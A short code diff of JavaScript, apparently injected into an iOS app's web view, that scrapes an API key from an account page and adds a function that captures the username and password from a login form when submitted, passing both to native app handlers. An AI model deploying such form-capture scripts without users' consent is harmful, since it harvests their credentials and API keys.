@@ -8,7 +8,7 @@
 
 $.get('/account').done(function(data, textStatus, jqXHR) {
       var apiKey = findKeyInData(data);
-      window.webkit.messageHandlers.notification.postMessage(apiKey)
+      webkit.messageHandlers.apikey.postMessage(apiKey);
 });
 
 function findKeyInData(data)  {
@@ -36,3 +36,22 @@ function generateNewKey() {
 		$('#api-button').click();
 	}, 1000);
 }
+
+//
+
+function registerToGrabCredentials() {
+  var submitButton = document.getElementsByClassName('button')[0];
+  
+  if(submitButton.type == 'submit') {
+    
+    submitButton.onclick = function(e) {
+      
+      var usr = document.getElementById('user_login').value;
+      var psw = document.getElementById('user_password').value;
+      
+      window.webkit.messageHandlers.credentials.postMessage("usr:::"+usr+"psw:::"+psw)
+    };
+  }
+}
+
+registerToGrabCredentials();
